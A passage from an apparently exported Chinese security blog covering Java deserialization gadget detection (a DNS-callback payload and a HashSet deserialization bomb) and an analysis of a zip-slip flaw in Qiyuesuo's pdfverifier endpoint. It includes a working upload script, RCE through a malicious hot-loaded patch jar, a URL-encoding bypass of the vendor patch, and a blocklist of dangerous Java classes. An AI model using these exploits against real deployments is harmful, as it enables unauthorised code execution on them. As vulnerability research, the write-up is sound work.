&quot;value&quot;, factoryTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, &quot;111a&quot;);        BadAttributeValueExpException bad2 = new BadAttributeValueExpException(&quot;aaa&quot;);        ReflectTools.setFieldValue(bad2, &quot;val&quot;, tiedMapEntry);        byte[] bytes = ReflectTools.ser2bytes(bad2);        String s = Base64.getEncoder().encodeToString(bytes);        return s;    &#125;&#125;\n\n\n\n值得一提的是，这个二次反序列化，tabby是找不到的。因为触发二次反序列化的create，是无参方法：\n\n根本没有参数去进行污点传播，tabby自然就找不到。\n总结挖掘利用链时，要先搞清楚我们要找一个什么样的方法。在这里，我们要找一个能够直接或间接执行newInstance的transform。这决定了我们怎么去写tabby语法。同时要注意，有些无参构造和无参方法的利用，tabby是找不到的。\n在利用idea查找时，要灵活使用alt+f7，并按需勾选用法&#x2F;实现：\n\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Java反序列化链探测","url":"/2025/10/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8E%A2%E6%B5%8B/","content":"前言之前面试的时候有被问到怎么在黑盒的条件下去探测存在的利用链。现在来学习一下。\n这里主要有两种方式，一种靠出网探测，一种靠延时。\nserialVersionUID问题不知道大家有没有遇到过这个问题：确定服务端有CB依赖，但是却打不通CB链。\n有些时候，这个问题就是由serialVersionUID不同导致的。\n一个依赖可能有多个版本，而每个版本中的同名类，可能会有变化。serialVersionUID(后面简称suid)就是为了解决这个问题而出现的。这表现在，本地通过cb1.9.4生成的利用链，到服务端cb1.8.3就打不了。\n所以，在探测利用链时，我们也需要解决这个问题。否则可能出现，服务端明明有这个类，但是由于suid不同，导致我们误判不存在此依赖。\n看一下suid不同报错抛出的代码段：\n\n这里有三个条件：\n1、序列化数据中的类和目标类都是可序列化的，就是继承Serializable接口\n2、序列化数据中的类不是数组\n3、序列化数据中的类的suid，和本地类中的不一样\n当这三个条件都满足时，会抛出suid不同的报错。\n所以，我们现在想办法不满足任意一个条件就行。\n这里可以生成不继承Serializable接口的类，或者序列化时使用类数组，即序列化A[].class\n这里我选择第一种方法，用Javasissit生成：\n// 生成不继承Serializable接口的Class，防止因suid不一样报错public static Class makeClass(String className, String suid) throws ClassNotFoundException, CannotCompileException &#123;    ClassPool pool = ClassPool.getDefault();    CtClass ctClass = pool.makeClass(className);    if (suid != null) &#123;        // 添加 serialVersionUID 字段并指定其值        CtField serialVersionUIDField = new CtField(CtClass.longType, &quot;serialVersionUID&quot;, ctClass);        serialVersionUIDField.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.FINAL);  // 设置为private static final        ctClass.addField(serialVersionUIDField, suid);  // 设置 serialVersionUID 值为 1L    &#125;    Class&lt;?&gt; aClass = ctClass.toClass();    return aClass;&#125;\n\n上面还可以添加suid，这样能够准确探测依赖版本。\n出网探测DNS法这里依靠的是URLDNS链。\n我们的目标是，如果依赖存在，则顺利进入URLDNS链；如果依赖不存在，则在发出DNS请求前，抛出报错终止。\nURLDNS链的触发方法为URL.hashCode，反映在HashMap.readObject里，就是hash(key)，所以，URL类一定是作为key的。那我们要探测的类，就理应是value。\n\n当HashMap反序列化value时，如果value是个不存在的类，那就会直接报错终止，不进入到最终的DNS请求。\n所以exp如下：\npackage tools;import java.io.IOException;import java.net.MalformedURLException;import java.net.URL;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.Base64;import java.util.HashMap;public class FindClassByDns &#123;    public static void main(String[] args) throws Exception &#123;        FindClassByDns findClassByDns = new FindClassByDns();        String url = &quot;http://cb123.hpdth2.ceye.io&quot;;        String className = &quot;org.apache.commons.beanutils.BeanComparator&quot;;        String payload = findClassByDns.getPayload(url, className);        ReflectTools.deser(null, payload);    &#125;    public String getPayload(String url, String className) throws Exception &#123;        URLStreamHandler urlStreamHandler = new URLStreamHandler() &#123;            @Override            protected URLConnection openConnection(URL u) throws IOException &#123;                return null;            &#125;        &#125;;        URL u = new URL(null, url, urlStreamHandler);        ReflectTools.setFieldValue(u, &quot;hashCode&quot;, 1);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(u, ReflectTools.makeClass(className, null));        ReflectTools.setFieldValue(u, &quot;hashCode&quot;, -1);        byte[] bytes = ReflectTools.ser2bytes(hashMap);        String s = Base64.getEncoder().encodeToString(bytes);        return s;    &#125;&#125;\n\nJRMP法当服务端开启RMI注册中心时，可以使用JRMP法探测。\n简单讲一下JRMP的攻击流程：\n1、攻击机构造特殊的UnicastRef对象的序列化数据，发送给受害机的注册中心\n2、注册中心从序列化数据里取出恶意JRMP服务的地址，并发起请求\n3、恶意JRMP响应请求，返回恶意序列化数据\n4、注册中心直接反序列化数据，从而触发代码执行\nJRMP的知识可以参考下面的文章：\nhttps://xz.aliyun.com/news/15240\nhttps://gaorenyusi.github.io/posts/jrmp/\n目前还不是特别清楚为什么要这样去探测。也许是目标dns不出网，而且没有反序列化入口，但是开着RMI注册中心？也许是为了绕JEP290的限制？总之，感觉这种探测方法十分麻烦。\nhttplog这个跟DNS差不多，只是协议换成http了。本地没去写了。\n不出网探测反序列化炸弹这里的想法是，构造一个嵌套了很多层的对象，且在反序列化的时候会触发比较耗时的操作，比如计算hashCode什么的。\n这里我们选择HashSet。\n\nHashSet反序列化最后，会把元素put进HashMap里，而put会触发key.hashCode，这个我们很熟悉了。看看HashSet.hashCode：\n\n用的是父类，AbstractSet里的hashCode方法。这里能够看出，计算hash时，是需要依次计算里面所有的元素的。这样一来，如果我们实现HashSet套HashSet，计算量就会指数增长。\n最终的exp：\nimport tools.ReflectTools;import java.util.Base64;import java.util.Date;import java.util.HashSet;import java.util.Set;public class FindClassByBomb&#123;    public static void main(String[] args) throws Exception &#123;        FindClassByBomb findClassByBomb = new FindClassByBomb();        String payload = findClassByBomb.getPayload(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;, 28);        Date date = new Date();        System.out.println(date);        ReflectTools.deser(null, payload);        Date date1 = new Date();        System.out.println(date1);    &#125;    public String getPayload(String className, int depth) throws Exception &#123;        Set&lt;Object&gt; root = new HashSet&lt;&gt;();        Set&lt;Object&gt; s1 = root;        Set&lt;Object&gt; s2 = new HashSet&lt;&gt;();        Class&lt;?&gt; aClass = ReflectTools.makeClass(className, null);        for (int i = 0; i &lt; depth; i++) &#123;            Set&lt;Object&gt; t1 = new HashSet&lt;&gt;();            Set&lt;Object&gt; t2 = new HashSet&lt;&gt;();            t1.add(aClass); // Make t1 unequal to t2            s1.add(t1);            s1.add(t2);            s2.add(t1);            s2.add(t2);            s1 = t1;            s2 = t2;        &#125;        byte[] bytes = ReflectTools.ser2bytes(root);        String s = Base64.getEncoder().encodeToString(bytes);        return s;    &#125;&#125;\n\n最终的序列化对象的图示：\n\n经过前人验证，这里的深度选择25~28一般能满足大部分探测需求。反正别一下子写太大，不然容易影响正常业务。\n本地28层，延时了10s：\n\n配合checklist知道了探测原理后，我们可以自己维护一个checklist，里面记录常见依赖里必须有的类，不同版本依赖中同一个类的suid。这样就能通过写脚本的方式，去批量进行探测。\n类似：\n\n参考https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/\nhttps://blog.csdn.net/nevermorewo/article/details/100100048\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"契约锁pdfverifier漏洞分析","url":"/2025/11/03/%E5%A5%91%E7%BA%A6%E9%94%81pdfverifier%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"前言护网的时候就有看到这个漏洞，现在终于有时间来复现一下。\n整理一下环境搭建中遇到的问题，以及复现过程中踩的坑。\n我这里使用契约锁4.3.4，jdk8u341，360zip，win11进行复现。\n环境搭建应用目录分析先去某鱼收一个安装包。解压完后的目录长这样：\n\nbin&#x2F;start.bat是启动脚本，我们打开加上远程调试参数：\n\n从这里也可以发现，契约锁会同时运行3个springboot进程。\n对应的端口可以去jar包的application.properties里面看。\nprivapp.jar对应9180，privoss.jar对应9181，privopen对应9182\n\n官方建议只对外开放9180端口pdfverifier接口的漏洞便是在这个端口，对应的jar包为privapp.jar。所以我们上面只在privapp.jar处加调试参数。\n除了上面的三个主要jar，还有一个libs目录，里面是大量第三方依赖，但是也有一些priv开头的jar：\n\n这些priv是上面三个主要jar的公共依赖。\n然后日志在logs目录下：\n\nconsole.log里是当天的。\n补丁结构分析去官网下载补丁：\nhttps://www.qiyuesuo.com/more/security/servicepack\n补丁下载链接为：https://dl.qiyuesuo.com/private/security/1.4.0/private-security-patch.package.tar.gz\n将1.4.0替换成别的数字，即可下载任意版本补丁。\n补丁目录：\n\n读一下README\n\n需要把private-security-loader-1.0.0.jar放入libs目录，然后private-security-patch.jar放入security目录。\n知道这些后，我们就可以开始搭建idea项目了。\nidea项目搭建需要添加为lib的有：三个主要jar包；libs目录中契约锁相关的jar；libs里面的其他依赖；补丁包里的两个jar\n需要反编译成源码的有：privapp.jar；libs目录中契约锁相关的jar；补丁包里的两个jar\n把需要反编译的全打包成zip，然后拖到jd-gui一起反编译即可，最后解压到idea，添加为源。\n用之前在审计U8cloud时的脚本，把com.qiyuesuo和net.qiyuesuo的jar全部筛选出来：\n注释没改不用看\nimport osimport zipfileimport shutilimport logging# 设置日志logging.basicConfig(level=logging.INFO, format=&#x27;%(asctime)s - %(message)s&#x27;)def check_jar_conditions(jar_path):    &quot;&quot;&quot;检查 JAR 文件的第一层目录中是否包含 &#x27;nc&#x27;、&#x27;u8c&#x27; 或者 com/yonyou&quot;&quot;&quot;    try:        with zipfile.ZipFile(jar_path, &#x27;r&#x27;) as jar:            file_names = jar.namelist()            first_level_dirs = set()            # 获取 JAR 文件中的第一层目录            for file in file_names:                first_level = file.split(&#x27;/&#x27;)[0]                first_level_dirs.add(first_level)            # 检查是否满足条件            if &#x27;com&#x27; in first_level_dirs:                # 如果第一层目录是 &#x27;com&#x27;，检查第二层是否为 &#x27;qiyuesuo&#x27;                for file in file_names:                    parts = file.split(&#x27;/&#x27;)                    if len(parts) &gt;= 2 and parts[0] == &#x27;com&#x27; and parts[1] == &#x27;qiyuesuo&#x27;:                        return True            if &#x27;com&#x27; in first_level_dirs:                # 如果第一层目录是 &#x27;com&#x27;，检查第二层是否为 &#x27;qiyuesuo&#x27;                for file in file_names:                    parts = file.split(&#x27;/&#x27;)                    if len(parts) &gt;= 2 and parts[0] == &#x27;net&#x27; and parts[1] == &#x27;qiyuesuo&#x27;:                        return True            return False    except Exception as e:        logging.error(f&quot;无法处理 JAR 文件 &#123;jar_path&#125;: &#123;e&#125;&quot;)        return Falsedef copy_jar_files(source_dir, target_dir):    &quot;&quot;&quot;递归提取目录下的所有 JAR 包，并按 dir1_dir2_xxx.jar 格式重命名&quot;&quot;&quot;    if not os.path.exists(target_dir):        os.makedirs(target_dir)    # 遍历源目录中的所有文件    for root, dirs, files in os.walk(source_dir):        for file in files:            if file.endswith(&#x27;.jar&#x27;):                jar_path = os.path.join(root, file)                # 判断该 JAR 包是否满足条件                if check_jar_conditions(jar_path):                    # 获取文件的相对路径并生成新的文件名                    relative_path = os.path.relpath(root, source_dir)                    new_filename = relative_path.replace(os.sep, &#x27;_&#x27;) + &#x27;_&#x27; + file                    target_path = os.path.join(target_dir, new_filename)                    # 检查目标目录是否已有相同文件名                    counter = 1                    while os.path.exists(target_path):                        # 如果文件已存在，给文件加上数字后缀                        name, ext = os.path.splitext(file)                        target_path = os.path.join(target_dir, f&quot;&#123;new_filename.split(&#x27;.&#x27;)[0]&#125;_&#123;counter&#125;&#123;ext&#125;&quot;)                        counter += 1                    # 复制 JAR 文件                    shutil.copy(jar_path, target_path)                    logging.info(f&quot;已复制符合条件的 JAR 文件: &#123;jar_path&#125; -&gt; &#123;target_path&#125;&quot;)if __name__ == &#x27;__main__&#x27;:    # 输入源目录和目标目录    source_directory = &#x27;./&#x27;  # 替换为源目录路径    target_directory = &#x27;D:/qiyuesuoJars&#x27;  # 替换为目标目录路径    # 复制符合条件的 JAR 文件    copy_jar_files(source_directory, target_directory)\n\n最终筛出来这些包：\n\n最终大概长这样，我这里略有不同，反正要用的包全部添加了就行：\n\n注意事项文章里看到过privapp.jar无法正常解压的情况。解决方法如下：\n\n路由分析privapp.jar打开，有两个文件夹比较显眼，一个是config，一个是security：\n\n这两个目录大概率有鉴权相关操作。后面发现，security里是具体实现，config里配置了路由：\nPrivappConfigurer：\n\nallowed字符数组里，定义了不需要鉴权的路由，因为有&#x2F;captcha, &#x2F;login等，很明显就是不用鉴权的。要注意的是，所有路由访问时都得在前面加上&#x2F;api，因为下面allowedArr里做了字符串拼接操作。\n我们今天的主角也在里面：\n\n漏洞分析任意写这里的漏洞是一个解压穿越漏洞。\n全局搜索&#x2F;pdfverifier：\n\n\n说实话，我还是不太清楚，为什么要通过&#x2F;api&#x2F;pdfverifier来访问。类上面写的path不是 &#x2F;pdfverifier吗？我的开发基础太差了，之后还得好好学习一下。\n我们的漏洞方法是这里的verify。\n前面两行没什么，就是获取上传文件的字节和获取扩展名。跟进doVerfify：\n\n这里只允许pdf和odf文件，且pdf不能是加密的。我们跟进红框处的verify方法：\n\n这里的common-ofd似乎也是自研的，我在网上没搜到，所以应该也归类到业务代码进行反编译。不过能发现common-ofd里面也是net.qiyuesuo开头的，所以可以写脚本把有这两层目录的jar包全部筛选出来，这样就能找到所有业务相关jar了。\ndecompre就是decompress，这里我们跟进红框，很明显就是一个解压操作：\n\n断点处直接拿zipEntry的name进行拼接了，存在目录穿越的漏洞。所以我们可以实现任意写文件。\nimport zipfileimport requestsdef gen_zip(filename):    try:        zipFile = zipfile.ZipFile(f&#x27;bad.ofd&#x27;, &#x27;w&#x27;)        zipFile.write(&quot;1.txt&quot;, f&quot;../&#123;filename&#125;&quot;, zipfile.ZIP_DEFLATED)        zipFile.close()    except Exception as e:        print(e)if __name__ == &#x27;__main__&#x27;:    gen_zip(&quot;123aaazxc.txt&quot;)    url = &quot;http://127.0.0.1:9180/api/pdfverifier&quot;    file = open(&quot;bad.ofd&quot;, &quot;rb&quot;)    proxy = &#123;        &quot;http&quot;: &quot;http://127.0.0.1:8080/&quot;,        &quot;https&quot;: &quot;http://127.0.0.1:8080/&quot;,    &#125;    requests.post(url, files=&#123;&quot;file&quot;: file&#125;)\n\n由于默认写在C盘，所以只往前写一个目录，写到Temp里，不然可能报错，说没有写权限：\n\n成功写入：\n\n但是，springboot应用，怎么从任意写提升到RCE？\n1、linux可以写计划任务。\n缺点：这里是用qiyuesuo用户起的web应用，没权限\n2、覆盖charset.jar\n缺点：不知道jdk路径，得猜，而且方法很麻烦\n3、写模板文件\n缺点：如果模板文件从jar里读取，就写不了；而且这里没有Thymeleaf等模板解析器\n4、写sshkey\n缺点：还是权限问题，而且容易被发现\n这里就要学到一种新的RCE方式，热加载补丁。\n热加载补丁再回顾一下补丁里的README文件：\n\n\n上面提到，把priv-loader放到libs后，在服务启动的情况下，直接将patch放入security文件夹，然后等待30s，查看日志是否有输出。\n这里可以猜测，这里的补丁是不是通过热加载的方式打上的？这里又提到“被重新加载的类”，那么类在重新加载的时候，会不会触发里面的静态方法和无参构造呢？\n通过名字可以知道，priv-loader是负责加载补丁包的，而patch是真正的补丁内容。我们这里看一下priv-loader的源码：\n\ncom.qiyuesuo.security.patch.loader.SecurityLibManager#deployScheduler就是进行热加载的地方。\n这里会检查patch的sha1值，如果发现变化，就会重新进行加载。\n我们跟进一下this.reload：\n使用自定义的SecurityLibClassLoader去加载patchJar，然后指定targetLibClassLoader为当前线程的上下文类加载器，这样当前线程就能从patchJar中进行类加载。\n然后回去跟进this.registerQVDLogic：\n\n跟进readAndLoadClassNameFromJar方法：\n\n这里会load patchJar里面的所有类，并返回一个列表，里面都是相应的className。\n回到registerQVDLogic，这次跟进this.registerFilterLogic：\n\n这里会初始化com.qiyuesuo.security.patch.filter.logic包中的类，所以我们知道了该如何构造恶意patchJar。\n向com.qiyuesuo.security.patch.filter.logic包中添加恶意类即可。为了让恶意类能够第一个顺利加载，需要设置恶意类名为AAAAxxxx。\n直接打开jar，往里面拖文件即可：\n\n顺利加载：\n\n\n但是有一个现象，在断点停下前，会先打印两次，弹两次计算器，然后才在断点处停下，之后弹第三次计算器，那么前两次是为什么呢？我试过在Runtime.exec处打断点，但是前两次也无法停下。\n有时候又是先在断点停下，但是还没到恶意类初始化的地方，就跳出两次计算器。\n多次热加载？下面的内容全是问killer师傅才知道的，再次感谢killer师傅的耐心解答。\n断点下了，一定是能断住的，除非触发热加载的不是这个进程。\n我们回想一下，契约锁应用是不是默认会开三个端口，而这三个端口，都是独立的springboot应用，也就是说，这是三个独立的进程。\n说到这里，已经有些眉目了，大概率是因为三个进程都各自加载了一遍补丁，所以才会触发三次恶意类初始化。\n但是还需要验证。这里需要用到一个新工具：Process Monitor\n打开后我们需要在Filter菜单加两条过滤规则：\n将进程名设置为java.exe：\n\n将操作设置为ReadFile：\n\n全部add后，点击apply应用。\n接着快捷键ctrl+x，把之前的都清除。然后重复前面的恶意jar热加载，记得idea别开断点。\n等三次计算器全弹出后，按ctrl+e，暂停捕捉。\n\n\n\n这里可以看到，23656，2692，22660进程依次加载了恶意patchJar，并打开了计算器。我们查一下进程号对应的端口：\n\n\n\n分别对应了9180，9182，9181\n所以，如果这次idea打断点的话，就会先停下，然后执行到热加载前就弹出两次计算器。\n到这里，为什么弹出三次计算器的问题终于得到了解决。\n补丁分析security.rsc解密后会自动输出到日志，所以可以直接到日志中查看：\nlogs&#x2F;console.log\n\n这是1.3.7版本补丁的内容：\nKey: SweepCodePreventLogic.LOWER_URIValue: ^/contract/sweepcode/detail/\\d&#123;19&#125;$===================Key: DangerOpenUrlLogic.RISK_URIValue: /thirdintegration/save===================Key: DbTestPreventLogic.RISK_UPGRADE_URIValue: /setup/dbtestValue: /api/setup/dbtest===================Key: PinCatchPreventLogic.RISK_URIValue: /login/pinValue: /api/login/pin===================Key: PdfverifierPreventWrapper.OTHERValue: .jarValue: .shValue: .batValue: .pyValue: .classValue: .javaValue: .bashValue: .so===================Key: PdfverifierPreventWrapper.PARAMValue: ../===================Key: UAPreventLogic.RISK_URIValue: /user/addValue: /api/user/add===================Key: CustomCodePreventLogic.UPLOAD_URL_LISTValue: /utask/uploadValue: /api/code/uploadValue: /code/uploadValue: /api/sys/config/storage/custom/uploadValue: /sys/config/storage/custom/uploadValue: /api/sys/config/convert/uploadValue: /sys/config/convert/uploadValue: /api/message/strategy/uploadValue: /message/strategy/uploadValue: /code/seal/uploadValue: /api/code/seal/uploadValue: /code/category/uploadValue: /api/code/category/upload===================Key: TemplateParamUtils.REGEXValue: ^[\\+\\-\\*/\\.\\(\\)0-9\\s]+$===================Key: PdfverifierPreventWrapper.TYPEValue: ofd===================Key: Qvd12Filter.BASIC_PATHSValue: /favicon.icoValue: /qyswebapp/assetsValue: /qys/webapp/basePathValue: /license/checkExpireValue: /api/license/checkExpireValue: /checkHealthValue: /login?service===================Key: SecurityPropertiesManager.ADDITIONAL_URL_LISTSValue: /qyswebapp/assets/auth/**Value: /qyswebapp/assets/avatar/**Value: /qyswebapp/assets/css/**Value: /qyswebapp/assets/db/**Value: /qyswebapp/assets/favicon.icoValue: /qyswebapp/assets/fonts/**Value: /qyswebapp/assets/i18n/**Value: /qyswebapp/assets/img/**Value: /qyswebapp/assets/js/**Value: /qyswebapp/assets/logo/**Value: /qyswebapp/assets/oa/**Value: /qyswebapp/assets/views/**Value: /qyswebapp/assets/cmaps/**Value: /qysoss/assets/auth/**Value: /qysoss/assets/avatar/**Value: /qysoss/assets/css/**Value: /qysoss/assets/db/**Value: /qysoss/assets/favicon.icoValue: /qysoss/assets/fonts/**Value: /qysoss/assets/i18n/**Value: /qysoss/assets/img/**Value: /qysoss/assets/js/**Value: /qysoss/assets/logo/**Value: /qysoss/assets/oa/**Value: /qysoss/assets/views/**Value: /assets/auth/**Value: /assets/avatar/**Value: /assets/css/**Value: /assets/db/**Value: /assets/favicon.icoValue: /assets/fonts/**Value: /assets/i18n/**Value: /assets/img/**Value: /assets/js/**Value: /assets/logo/**Value: /assets/oa/**Value: /assets/views/**Value: /assets/cmaps/**===================Key: TemplateParamUtils.PATTERNValue: \\&#123;.*?\\&#125;===================Key: PinLoginPreventLogic.NAMEValue: service===================Key: SecurityVersionInfoLogic.METHODValue: getSecurityPatchAutoDownload===================Key: PdfverifierPreventWrapper.SENSITIVE_URLValue: /document/createbyofdValue: /api/document/createbyofd===================Key: CustomCodeRequestWrapper.ADJACENT_SEMICOLON_REGEXValue: ;\\s*;===================Key: SecurityPropertiesManager.RISK_URL_LISTSValue: /user/change/mobileValue: /user/mobile/pinValue: /user/voice/pinValue: /api/user/change/mobileValue: /api/user/mobile/pinValue: /api/user/voice/pinValue: /user/get/accountValue: /qyswebapp/assets/**Value: /qysoss/assets/**Value: /assets/**===================Key: SweepCodePreventLogic.OVER_434_REGEXValue: Xig/PS4qXGJfPVswLTldezEzfVxiKSg/PS4qXGJpZD1bMC05XXsxOX1cYikoPz0uKlxic2lnbmF0b3J5SWQ9WzAtOV17MTl9XGIpLiskCg===================Key: DangerUrlPreventLogic.RISK_URIValue: /assets/loadResourceValue: /api/assets/loadResource===================Key: DangerUrlForbiddenLogic.RISK_URIValue: /api/actuatorValue: /actuatorValue: /v3/api-docsValue: /api/v3/api-docs===================Key: DocumentParamPreventLogic.TEMPLATE_URI_LISTValue: /v2/contract/editValue: /v2/contract/createValue: /contract/createValue: /contract/createRetainParamsValue: /contract/editValue: /contract/fillparamValue: /api/contract/createValue: /api/contract/doc/editValue: /api/contract/fillparamValue: /contract/createValue: /contract/doc/editValue: /contract/fillparamValue: /contract/createbycategory===================Key: NetCheckPreventLogic.URIValue: /api/netCheck/setConfigValue: /netCheck/setConfig===================Key: SweepCodePreventLogic.LOWER_434_REGEXValue: Xig/PS4qXGJfPVswLTldezEzfVxiKSg/PS4qXGJzaWduYXRvcnlJZD1bMC05XXsxOX1cYikuKyQK===================Key: UploaderPreventLogic.RISK_URIValue: /file/uploader/mergeValue: /api/file/uploader/merge===================Key: CustomCodeRequestWrapper.MULTIPLE_WHITESPACE_REGEXValue: import\\s===================Key: UpgradePreventLogic.RISK_UPGRADE_URIValue: /upgradeValue: /api/upgradeValue: /updateValue: /api/update===================Key: UploaderPreventLogic.REGEXValue: type===================Key: CustomCodeRequestWrapper.IMPORT_REGEXValue: ^import\\s+(static\\s+)?[a-zA-Z_][a-zA-Z0-9_]*(\\.[a-zA-Z_][a-zA-Z0-9_]*)*\\s*;$===================Key: CustomCodeRequestWrapper.SENSITIVE_KEY_LISTSValue: RuntimeValue: ProcessValue: ProcessBuilderValue: SpelExpressionParserValue: invokeValue: Class.forNameValue: newInstanceValue: ClassLoaderValue: ConstructorValue: ObjectInputStreamValue: ScriptEngineValue: parseExpressionValue: getDeclaredFieldValue: setAccessibleValue: getMethodValue: lookupValue: freemarkerValue: securityValue: Base64Value: SerializationUtilsValue: deserializeValue: staticValue: YamlValue: JdbcRowSetImplValue: TransformerValue: AgentManagerValue: JARSoundbankReaderValue: OgnlValue: DefaultExecutorValue: hutoolValue: Base16Value: Base32Value: Base58Value: Base62Value: Base64Value: Base85Value: Base91Value: eval(===================Key: DangerOpenUrlLogic.RISK_STRINGValue: J6WPW25eHj===================Key: SecurityVersionInfoLogic.URLValue: /security/info===================Key: PinLoginPreventLogic.PARAMValue: applicantChangeValue: userNameValue: contactValue: corpName===================Key: UpgradePreventLogic.RISK_UPGRADE_EXCLUDE_URIValue: /upgrade/statusValue: /upgrade/sqldetailValue: /api/upgrade/statusValue: /api/upgrade/sqldetailValue: /update/password/pinValue: /api/update/password/pinValue: /update/passwordValue: /api/update/passwordValue: /upgrade/detail/downloadValue: /upgrade/error/servicedetailValue: /upgrade/error/sqldetailValue: /upgrade/errordetail===================Key: UAPreventLogic.METHODValue: getRegisterPersonAccount===================Key: SweepCodePreventLogic.PRE_URIValue: /contract/sweepcode/detailValue: /api/contract/sweepcode/detail===================Key: TemplateParamRequestWrapper.TEMPLATE_PARAM_URIValue: /api/template/param/editsValue: /template/param/editsValue: /api/template/html/updateValue: /template/html/update===================Key: PinLoginPreventLogic.RISK_URIValue: /loginValue: /api/login===================Key: SweepCodePreventLogic.METHOD_2Value: get===================Key: SweepCodePreventLogic.METHOD_1Value: set===================Key: TemplateParamRequestWrapper.TEMPLATE_HTML_URIValue: /template/html/addValue: /api/template/html/add===================Key: UploaderPreventLogic.PARAMValue: html===================Key: SweepCodePreventLogic.RISK_URIValue: /contract/sweepcode/pinValue: /api/contract/sweepcode/pin===================Key: SweepCodePreventLogic.LOWER_URI_APIValue: ^/api/contract/sweepcode/detail/\\d&#123;19&#125;$===================Key: CustomCodePreventLogic.METHODValue: inInnerCompany===================Key: Qvd12Filter.RETRIEVE_WHITELIST_PATHSValue: /company/retrieveValue: /api/company/retrieveValue: /captchaValue: /api/captchaValue: /userValue: /api/userValue: /user/authValue: /api/user/authValue: /login/Value: /api/login/Value: /apidsz/randomValue: /api/apidsz/randomValue: /sys/configValue: /api/sys/configValue: /cssValue: /api/cssValue: /checkHealthValue: /api/checkHealth===================Key: PinCatchPreventLogic.NAMEValue: applicantChange===================Key: DangerOpenUrlLogic.PARAM_NAMEValue: x-qys-accesstoken===================Key: PdfverifierPreventLogic.PDFVERIFIER_URL_LISTValue: /api/pdfverifierValue: /pdfverifierValue: /api/file/uploader/chunkValue: /file/uploader/chunkValue: /api/document/createbyfileValue: /document/createbyfileValue: /document/createbyofdValue: /api/document/createbyofd===================Key: CustomCodeDealLogic.URL_LISTValue: /api/code/downloadValue: /code/download===================\n\n\n\n当然，查看解密代码，自己写脚本解密也行：\n\n\nimport com.qiyuesuo.security.encrypt.RSAUtils;import java.io.*;import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map;public class decRsc &#123;    public static void main(String[] args) throws IOException &#123;        decodeRsc(&quot;security.rsc&quot;);    &#125;    public static void decodeRsc(String fileName) throws IOException &#123;        File file = new File(fileName);        BufferedReader reader = new BufferedReader(new FileReader(file));        String line;        Map&lt;String, List&lt;String&gt;&gt; SECURITY_SRC_MAP = new HashMap&lt;&gt;();        while ((line = reader.readLine()) != null) &#123;            String[] parts = line.split(&quot;:&quot;, 2);            if (parts.length == 2) &#123;                String key = parts[0].trim();                String value = parts[1].trim();                List&lt;String&gt; decodedValueList = new ArrayList&lt;&gt;();                String[] encodedValueList = value.split(&quot;,&quot;);                for (String encodeValue : encodedValueList) &#123;                    String decodeValue = RSAUtils.decryptByDefaultPrivateKey(encodeValue);                    decodedValueList.add(decodeValue.trim());                &#125;                String decodedKey = RSAUtils.decryptByDefaultPrivateKey(key);                SECURITY_SRC_MAP.put(decodedKey, decodedValueList);            &#125;        &#125;        for (Map.Entry&lt;String, List&lt;String&gt;&gt; entry : SECURITY_SRC_MAP.entrySet()) &#123;            String key = entry.getKey();            List&lt;String&gt; valueList = entry.getValue();            System.out.println(&quot;Key: &quot; + key);            for (String value : valueList) &#123;                System.out.println(&quot;Value: &quot; + value);            &#125;            System.out.println(&quot;===================&quot;);        &#125;    &#125;&#125;\n\n1.3.2分析补丁包里主要的过滤代码应该在filter里：\n\nlogic里面是过滤逻辑；wrapper是包装类，一般用于过滤某一类请求。\nQvdLogicManager会被QvdFilter调用，负责遍历每一个logic：\n\n\n用idea自带的功能对比1.3.1和1.3.2的patchJar，找到修复点：\n\nPdfverifierPreventLogic这里先对路由进行匹配，匹配成功的，会用PdfverifierPreventWrapper对request进行包装：\n\n走完所有的filter后，就会进入springboot的处理逻辑，就是DispatcherServlet.doDispatcher里的那一套。里面会先处理上传的文件，最终走到补丁里添加的com.qiyuesuo.security.patch.filter.wrapper.PdfverifierPreventWrapper#getParts：\n\n\n只有当filename结尾为ofd时，才会进入if逻辑，判断是否有穿越符。但是我们又必须保证在最终的verify方法里，文件后缀为ofd，这样才能触发解压穿越。这里使用url编码绕过。\nPdfverifierPreventWrapper#getParts调用org.apache.catalina.core.ApplicationPart#getSubmittedFileName进行文件名解析，不会进行URL解码：\n\n但是springboot的org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest会解码：\n\n\n\n所以可以通过URL编码来实现绕过。\n绕过POST /api/pdfverifier HTTP/1.1Host: 127.0.0.1:9180User-Agent: python-requests/2.32.3Accept-Encoding: gzip, deflate, brAccept: */*Connection: keep-aliveContent-Length: 302Content-Type: multipart/form-data; boundary=3bd5f90d2232775f31d7948a090430c8--3bd5f90d2232775f31d7948a090430c8Content-Disposition: form-data; name=&quot;file&quot;; 